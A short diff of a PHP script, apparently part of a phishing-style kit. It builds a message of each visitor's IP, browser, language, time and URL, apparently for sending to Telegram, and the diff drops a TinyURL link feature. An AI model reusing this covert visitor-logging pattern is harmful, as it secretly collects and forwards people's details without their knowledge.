@@ -23,7 +23,6 @@
 require('telegramapi.php');
 require('config.php');
 require('ipapi.php');
-require('tinyurlapi.php');
 require('browsers_ignore.php');
 
 
@@ -35,7 +34,6 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 $accept=$_SERVER['HTTP_ACCEPT_LANGUAGE'];
 $today = date("l, F j, Y, g:i a") ;
 $script_url = $_SERVER['SCRIPT_URI'];
-$tinyurl = get_timed_link($script_url);
 
 $message = "
 Ip: $ip
@@ -43,7 +41,6 @@ Browser: $userAgent
 Lingua: $accept
 Giorno & Ora : $today
 Url: $script_url
-TinyUrl: $tinyurl
 ID : $lid
 ";
 
